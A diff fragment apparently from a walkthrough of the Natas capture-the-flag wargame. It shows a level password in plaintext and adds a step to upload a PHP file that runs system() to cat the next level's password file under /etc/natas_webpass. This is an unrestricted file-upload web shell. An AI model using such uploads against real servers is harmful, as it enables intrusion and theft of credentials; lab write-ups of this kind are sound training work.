@@ -25,6 +25,7 @@ Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
   </body>
   </html>
   ```
+  - Save the following as file `natas12_getpass.php` and load it into `natas12_form.html`:
   ```php
   <?php
   system("cat /etc/natas_webpass/natas13")
